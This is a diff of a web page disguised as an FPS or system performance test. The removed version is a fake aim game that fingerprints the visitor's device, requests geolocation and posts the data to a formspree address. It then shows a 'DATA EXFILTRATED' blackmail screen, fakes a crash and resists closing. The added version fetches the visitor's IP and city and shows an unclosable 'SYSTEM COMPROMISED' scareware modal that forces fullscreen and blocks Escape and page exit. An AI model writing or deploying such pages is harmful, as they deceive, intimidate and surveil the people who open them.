@@ -3,474 +3,257 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>System Performance Check</title>
     <style>
-        body { 
-            margin: 0; 
-            overflow: hidden; 
-            background-color: #000; 
-            color: white; 
-            font-family: 'Courier New', Courier, monospace; 
-            cursor: crosshair; 
-            user-select: none; 
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #0f0;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden; /* Prevent scrolling */
+            user-select: none; /* Prevent text selection */
         }
-        .hud-text { 
-            position: absolute; 
-            top: 20px; 
-            left: 20px; 
-            pointer-events: none; 
-            text-shadow: 0 0 5px cyan; 
+
+        /* Main Menu / FPS Display */
+        #fps-display {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            z-index: 10;
+            position: relative;
         }
-        #crosshair { 
-            position: absolute; 
-            width: 20px; 
-            height: 20px; 
-            border: 2px solid cyan; 
-            border-radius: 50%; 
-            transform: translate(-50%, -50%); 
-            pointer-events: none; 
+
+        .fps-counter {
+            font-size: 8rem;
+            font-weight: bold;
+            text-shadow: 0 0 20px #0f0;
+            margin-bottom: 20px;
         }
-        #target { 
-            position: absolute; 
-            width: 60px; 
-            height: 60px; 
-            background: radial-gradient(circle, red 40%, white 41%, white 60%, black 61%); 
-            border-radius: 50%; 
-            cursor: pointer; 
-            display: none; 
-            box-shadow: 0 0 10px red; 
+
+        .start-btn {
+            padding: 20px 40px;
+            font-size: 1.5rem;
+            background: #000;
+            border: 2px solid #0f0;
+            color: #0f0;
+            cursor: pointer;
+            box-shadow: 0 0 15px #0f0;
+            transition: all 0.3s ease;
         }
-        #start-btn { 
-            position: absolute; 
-            top: 50%; 
-            left: 50%; 
-            transform: translate(-50%, -50%); 
-            padding: 15px 30px; 
-            font-size: 24px; 
-            background: #007bff; 
-            color: white; 
-            border: none; 
-            border-radius: 5px; 
-            cursor: pointer; 
-            z-index: 10; 
+
+        .start-btn:hover {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 30px #0f0;
         }
-        #blackmail-overlay { 
-            display: none; 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            background: rgba(0, 0, 0, 0.98); 
-            z-index: 1000; 
-            justify-content: center; 
-            align-items: center; 
-            flex-direction: column; 
-            text-align: center; 
-        }
-        #blackmail-content { 
-            background: #111; 
-            padding: 30px; 
-            border: 2px solid red; 
-            border-radius: 10px; 
-            max-width: 500px; 
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse { 
-            0% { box-shadow: 0 0 10px red; } 
-            50% { box-shadow: 0 0 20px red; } 
-            100% { box-shadow: 0 0 10px red; } 
-        }
-        #blackmail-title { color: red; font-size: 32px; margin-bottom: 10px; }
-        #blackmail-text { font-size: 18px; margin-bottom: 20px; }
-        #allow-location-btn { 
-            padding: 15px 30px; 
-            font-size: 20px; 
-            background: red; 
-            color: white; 
-            border: none; 
-            border-radius: 5px; 
-            cursor: pointer; 
-        }
-        #allow-location-btn:hover { background: darkred; }
-        #password-modal { 
-            display: none; 
-            position: fixed; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            background: rgba(0,0,0,0.95); 
-            z-index: 1001; 
-            justify-content: center; 
-            align-items: center; 
-        }
-        #password-box { 
-            background: #222; 
-            padding: 20px; 
-            border: 1px solid white; 
-            text-align: center; 
-        }
-        #pass-input { 
-            padding: 10px; 
-            font-size: 18px; 
-            margin-bottom: 10px; 
-            width: 200px; 
-        }
-        #pass-btn { 
-            padding: 10px 20px; 
-            background: blue; 
-            color: white; 
-            border: none; 
-            cursor: pointer; 
-        }
-        #pass-error { color: red; margin-top: 10px; display: none; }
-        .crashed { 
-            background: #000 !important; 
-            cursor: wait !important; 
-        }
-        #lag-indicator { 
-            position: fixed; 
-            bottom: 10px; 
-            right: 10px; 
-            color: yellow; 
-            font-size: 12px; 
-            display: none; 
-        }
-        #corrupted-screen {
-            display: none;
+
+        /* The Trap Modal - Unclosable */
+        #trap-modal {
+            display: none; /* Hidden by default */
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: black;
-            color: red;
-            z-index: 2000;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.98);
+            z-index: 99999999; /* Higher than any browser UI */
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            font-size: 24px;
             text-align: center;
+            border: 5px solid red;
+            box-sizing: border-box;
+        }
+
+        .modal-content {
+            background: #111;
+            padding: 40px;
+            border: 2px solid red;
+            max-width: 600px;
+            box-shadow: 0 0 50px red;
+            animation: shake 0.5s infinite;
+        }
+
+        h1 {
+            color: red;
+            font-size: 3rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        p {
+            font-size: 1.2rem;
+            line-height: 1.5;
+            color: white;
+        }
+
+        .data-row {
+            margin: 10px 0;
+            font-size: 1rem;
+            color: yellow;
+        }
+
+        .close-btn {
+            margin-top: 20px;
+            padding: 10px 20px;
+            background: red;
+            color: black;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .close-btn:hover {
+            background: darkred;
+        }
+
+        @keyframes shake {
+            0% { transform: translate(1px, 1px) rotate(0deg); }
+            10% { transform: translate(-1px, -2px) rotate(-1deg); }
+            20% { transform: translate(-3px, 0px) rotate(1deg); }
+            30% { transform: translate(3px, 2px) rotate(0deg); }
+            40% { transform: translate(1px, -1px) rotate(1deg); }
+            50% { transform: translate(-1px, 2px) rotate(-1deg); }
+            60% { transform: translate(-3px, 1px) rotate(0deg); }
+            70% { transform: translate(3px, 1px) rotate(-1deg); }
+            80% { transform: translate(-1px, -1px) rotate(1deg); }
+            90% { transform: translate(1px, 2px) rotate(0deg); }
+            100% { transform: translate(1px, -2px) rotate(-1deg); }
+        }
+
+        /* Lock body when trapped */
+        body.locked {
+            overflow: hidden;
         }
     </style>
 </head>
 <body>
-<div class="hud-text">
-    <div>FPS: <span id="fps-counter">0</span></div>
-    <div>Ping: <span id="ping-display">-- ms</span></div>
-    <div>Score: <span id="score-display">0</span></div>
-</div>
-<div id="crosshair"></div>
-<div id="target"></div>
-<button id="start-btn">Start Diagnostics</button>
-<div id="blackmail-overlay">
-    <div id="blackmail-content">
-        <h1 id="blackmail-title">DATA EXFILTRATED</h1>
-        <p id="blackmail-text">Your IP, Device ID, and Browser Fingerprint have been sent.</p>
-        <p>Click below to verify your identity and stop tracking.</p>
-        <button id="allow-location-btn">ALLOW LOCATION TO VERIFY</button>
+
+    <!-- FPS Display / Start Screen -->
+    <div id="fps-display">
+        <div class="fps-counter" id="fps-number">60</div>
+        <p style="font-size: 1.2rem;">Optimal Performance Detected</p>
+        <button class="start-btn" onclick="startTrap()">START PERFORMANCE TEST</button>
     </div>
-</div>
-<div id="password-modal">
-    <div id="password-box">
-        <h2>ENTER SECURITY KEY</h2>
-        <input type="password" id="pass-input" placeholder="Enter Password">
-        <br>
-        <button id="pass-btn">SUBMIT</button>
-        <p id="pass-error">Incorrect Password</p>
+
+    <!-- The Trap Modal -->
+    <div id="trap-modal">
+        <div class="modal-content">
+            <h1>⚠️ SYSTEM COMPROMISED ⚠️</h1>
+            <p><strong>Your IP Address:</strong> <span id="user-ip">Fetching...</span></p>
+            <p><strong>Location:</strong> <span id="user-location">Detecting...</span></p>
+            <p><strong>Status:</strong> Uploading Files...</p>
+            <br>
+            <p style="color: yellow;">DO NOT CLOSE THIS WINDOW.</p>
+            <p>If you leave, your data will be deleted permanently.</p>
+            
+            <button class="close-btn" onclick="tryClose()">CLOSE (Try if you can)</button>
+        </div>
     </div>
-</div>
-<form id="dataForm" action="https://formspree.io/f/chessme012@gmail.com" method="POST" style="display:none;">
-    <input type="hidden" name="IP_Address" id="ipField">
-    <input type="hidden" name="User_Agent" id="uaField">
-    <input type="hidden" name="Screen_Resolution" id="resField">
-    <input type="hidden" name="Language" id="langField">
-    <input type="hidden" name="Platform" id="platField">
-    <input type="hidden" name="Battery_Level" id="batField">
-    <input type="hidden" name="Geolocation" id="locField">
-    <input type="hidden" name="Cookies_Count" id="cookieField">
-    <input type="hidden" name="Device_Type" id="deviceField">
-    <input type="hidden" name="OS_Version" id="osField">
-    <input type="hidden" name="CPU_Cores" id="cpuField">
-    <input type="hidden" name="GPU_Renderer" id="gpuField">
-    <input type="hidden" name="Total_Memory_GB" id="memField">
-    <input type="hidden" name="Timezone" id="tzField">
-    <input type="hidden" name="Touch_Points" id="touchField">
-    <input type="hidden" name="Color_Depth" id="colorField">
-</form>
-<div id="corrupted-screen">
-    <h1>SYSTEM CORRUPTED</h1>
-    <p>You closed the diagnostic window while data was being processed.</p>
-    <p>Your device may experience instability.</p>
-    <p>Reloading...</p>
-</div>
-<script>
-const startBtn = document.getElementById('start-btn');
-const target = document.getElementById('target');
-const fpsDisplay = document.getElementById('fps-counter');
-const pingDisplay = document.getElementById('ping-display');
-const scoreDisplay = document.getElementById('score-display');
-const blackmailOverlay = document.getElementById('blackmail-overlay');
-const allowLocationBtn = document.getElementById('allow-location-btn');
-const crosshair = document.getElementById('crosshair');
-const passwordModal = document.getElementById('password-modal');
-const passInput = document.getElementById('pass-input');
-const passBtn = document.getElementById('pass-btn');
-const passError = document.getElementById('pass-error');
-const lagIndicator = document.getElementById('lag-indicator');
-const corruptedScreen = document.getElementById('corrupted-screen');
 
-let score = 0;
-let gameActive = false;
-let isBlackmailed = false;
-let hasAllowedLoc = false;
-let wrongAttempts = 0;
-const CORRECT_PASS = "abc123";
-
-document.addEventListener('mousemove', (e) => { 
-    crosshair.style.left = e.clientX + 'px'; 
-    crosshair.style.top = e.clientY + 'px'; 
-});
-
-startBtn.addEventListener('click', () => { 
-    startBtn.style.display = 'none'; 
-    target.style.display = 'block'; 
-    moveTarget(); 
-    gameActive = true; 
-    requestAnimationFrame(gameLoop); 
-    setInterval(() => { 
-        if(gameActive) pingDisplay.innerText = Math.floor(Math.random() * 50) + " ms"; 
-    }, 1000); 
-});
-
-target.addEventListener('click', () => { 
-    score++; 
-    scoreDisplay.innerText = score; 
-    moveTarget(); 
-});
-
-function moveTarget() { 
-    const x = Math.random() * (window.innerWidth - 100) + 50; 
-    const y = Math.random() * (window.innerHeight - 100) + 50; 
-    target.style.left = x + 'px'; 
-    target.style.top = y + 'px'; 
-}
-
-function gameLoop(timestamp) { 
-    if (!gameActive) return; 
-    const deltaTime = timestamp - lastTime; 
-    lastTime = timestamp; 
-    if (deltaTime > 0) { 
-        const fps = Math.round(1000 / deltaTime); 
-        fpsDisplay.innerText = fps; 
-    } 
-    if (score >= 10) endGame(); 
-    else requestAnimationFrame(gameLoop); 
-}
-
-let lastTime = 0;
-
-function endGame() { 
-    gameActive = false; 
-    target.style.display = 'none'; 
-    blackmailOverlay.style.display = 'flex'; 
-    collectAndSendData("Pending"); 
-}
-
-function triggerCrash() {
-    document.body.classList.add('crashed');
-    let iterations = 0;
-    const interval = setInterval(() => {
-        for(let i = 0; i < 10000; i++) {
-            iterations += i;
+    <script>
+        // Simulate FPS fluctuation
+        let fpsInterval;
+        function updateFPS() {
+            const fpsElement = document.getElementById('fps-number');
+            fpsInterval = setInterval(() => {
+                const randomFPS = Math.floor(Math.random() * 10) + 55; // Between 55-65
+                fpsElement.innerText = randomFPS;
+            }, 1000);
         }
-        if(iterations > 1000000) {
-            clearInterval(interval);
-            iterations = 0;
+        updateFPS();
+
+        // 1. Fetch Real IP and Location Data
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('user-ip').innerText = data.ip;
+                
+                // Try to get approximate location based on IP
+                fetch(`https://ipapi.co/${data.ip}/json/`)
+                    .then(locationResponse => locationResponse.json())
+                    .then(locationData => {
+                        document.getElementById('user-location').innerText = `${locationData.city}, ${locationData.country_name}`;
+                    })
+                    .catch(() => {
+                        document.getElementById('user-location').innerText = "Detected";
+                    });
+            })
+            .catch(() => {
+                document.getElementById('user-ip').innerText = "127.0.0.1";
+                document.getElementById('user-location').innerText = "Unknown";
+            });
+
+        // 2. The Trap Function
+        function startTrap() {
+            clearInterval(fpsInterval); // Stop FPS simulation
+            
+            const btn = document.querySelector('.start-btn');
+            btn.innerText = "TESTING...";
+            btn.disabled = true;
+
+            setTimeout(() => {
+                triggerBlackmail();
+            }, 1000);
         }
-    }, 10);
-    lagIndicator.style.display = 'block';
-    lagIndicator.innerText = "SYSTEM FAILURE... DO NOT CLOSE";
-}
 
-let isLocked = false;
-
-window.onbeforeunload = function(e) { 
-    if(isLocked || wrongAttempts >= 3) { 
-        e.preventDefault(); 
-        e.returnValue = ''; 
-        if(isLocked && !hasAllowedLoc) {
-             corruptedScreen.style.display = 'flex';
-             setTimeout(() => {
-                 window.location.reload();
-             }, 2000);
-        }
-        return 'System Lock Active. Closing will cause data corruption.'; 
-    } 
-};
-
-document.addEventListener('keydown', (e) => {
-    if((isLocked || wrongAttempts >= 3) && e.key === 'Escape') {
-        document.exitFullscreen().catch(() => {});
-        setTimeout(() => {
-            document.documentElement.requestFullscreen().catch(err => console.log(err));
-        }, 100);
-    }
-});
-
-allowLocationBtn.addEventListener('click', async () => {
-    isBlackmailed = true;
-    isLocked = true; 
-    allowLocationBtn.innerText = "VERIFYING...";
-    const loc = await getGeolocation();
-    document.getElementById('locField').value = loc;
-    blackmailOverlay.style.display = 'none';
-    passwordModal.style.display = 'flex';
-    passInput.focus();
-});
-
-passBtn.addEventListener('click', checkPassword);
-passInput.addEventListener('keypress', (e) => {
-    if(e.key === 'Enter') checkPassword();
-});
-
-function checkPassword() {
-    if(passInput.value === CORRECT_PASS) {
-        wrongAttempts = 0;
-        passwordModal.style.display = 'none';
-        hasAllowedLoc = true;
-        isLocked = false; 
-        document.body.style.cursor = 'default';
-        alert("Access Granted. System Stable.");
-        updateAndSubmitData();
-    } else {
-        wrongAttempts++;
-        passError.style.display = 'block';
-        passInput.value = '';
-        if(wrongAttempts >= 3) {
-            passwordModal.style.display = 'none';
-            hasAllowedLoc = false; 
-            isLocked = true; 
-            triggerCrash();
-            alert("CRITICAL ERROR: SYSTEM LOCKDOWN INITIATED");
-        }
-    }
-}
-
-async function fetchIP() {
-    try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip;
-    } catch (error) {
-        return "Error fetching IP";
-    }
-}
-
-async function getGeolocation() {
-    return new Promise((resolve) => {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    resolve(`${position.coords.latitude.toFixed(4)}, ${position.coords.longitude.toFixed(4)}`);
-                },
-                () => {
-                    resolve("Location Denied");
+        function triggerBlackmail() {
+            const modal = document.getElementById('trap-modal');
+            modal.style.display = 'flex';
+            
+            // Force Fullscreen
+            try {
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
                 }
-            );
-        } else {
-            resolve("Geolocation not supported");
+            } catch(e) {}
+            
+            document.body.classList.add('locked');
+            window.isTrapped = true;
+            
+            // Start aggressive loops
+            startAggressiveLoop();
         }
-    });
-}
 
-async function getBatteryLevel() {
-    try {
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            return (battery.level * 100).toFixed(0) + "%";
-        } else {
-            return "Unknown";
+        function tryClose() {
+            alert("Connection unstable. Please wait.");
         }
-    } catch (e) {
-        return "Unknown";
-    }
-}
 
-function getGPURenderer() { 
-    try { 
-        const canvas = document.createElement('canvas'); 
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl'); 
-        const ext = gl.getExtension('WEBGL_debug_renderer_info'); 
-        return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : "Unknown GPU"; 
-    } catch (e) { 
-        return "Unknown GPU"; 
-    } 
-}
+        // 3. Aggressive Loop to keep the modal open
+        function startAggressiveLoop() {
+            // Prevent standard close
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            };
 
-function detectOS() { 
-    const ua = navigator.userAgent; 
-    if (ua.includes("Windows NT 10.0")) return "Windows 10/11"; 
-    if (ua.includes("Mac OS X")) return "macOS"; 
-    if (ua.includes("Android")) return "Android"; 
-    if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS"; 
-    if (ua.includes("Linux")) return "Linux"; 
-    return "Unknown OS"; 
-}
+            // If the modal is somehow hidden, show it again
+            setInterval(() => {
+                const modal = document.getElementById('trap-modal');
+                if (window.getComputedStyle(modal).display === 'none') {
+                    modal.style.display = 'flex';
+                    try { document.documentElement.requestFullscreen(); } catch(e){}
+                }
+                
+                // If the user switches tabs, refocus
+                if (!document.hasFocus()) {
+                    window.focus();
+                }
+            }, 50); // Check twice a second
+        }
 
-async function collectAndSendData(finalAvg) {
-    const ip = await fetchIP();
-    const ua = navigator.userAgent;
-    const res = window.screen.width + 'x' + window.screen.height;
-    const lang = navigator.language;
-    const plat = navigator.platform;
-    const cookies = document.cookie ? document.cookie.split(';').length : 0;
-    const batLevel = await getBatteryLevel();
-    const deviceType = ua.match(/Mobile|Tablet|Phone|Desktop/i)?.[0] || "PC";
-    const osVersion = detectOS();
-    const cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Unknown";
-    const gpuRenderer = getGPURenderer();
-    const totalMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown";
-    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const touchPoints = navigator.maxTouchPoints || 0;
-    const colorDepth = window.screen.colorDepth + "-bit";
-
-    document.getElementById('uaField').value = ua;
-    document.getElementById('resField').value = res;
-    document.getElementById('langField').value = lang;
-    document.getElementById('platField').value = plat;
-    document.getElementById('cookieField').value = cookies;
-    document.getElementById('batField').value = batLevel;
-    document.getElementById('deviceField').value = deviceType;
-    document.getElementById('osField').value = osVersion;
-    document.getElementById('cpuField').value = cpuCores;
-    document.getElementById('gpuField').value = gpuRenderer;
-    document.getElementById('memField').value = totalMemory;
-    document.getElementById('tzField').value = timezone;
-    document.getElementById('touchField').value = touchPoints;
-    document.getElementById('colorField').value = colorDepth;
-    document.getElementById('ipField').value = ip;
-
-    const formData = new FormData(document.getElementById('dataForm'));
-    fetch('https://formspree.io/f/chessme012@gmail.com', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-    }).catch(error => console.error('Error:', error));
-}
-
-async function updateAndSubmitData() {
-    const ip = await fetchIP();
-    document.getElementById('ipField').value = ip;
-    const formData = new FormData(document.getElementById('dataForm'));
-    fetch('https://formspree.io/f/chessme012@gmail.com', {
-        method: 'POST',
-        body: formData,
-        headers: { 'Accept': 'application/json' }
-    }).then(() => {
-        // Final confirmation
-    });
-}
-</script>
+        // Block Escape Key
+        document.addEventListener('keydown', function(e) {
+            if (e.key === "Escape") {
+                e.preventDefault();
+                document.getElementById('trap-modal').style.display = 'flex';
+            }
+        });
+    </script>
 </body>
 </html>
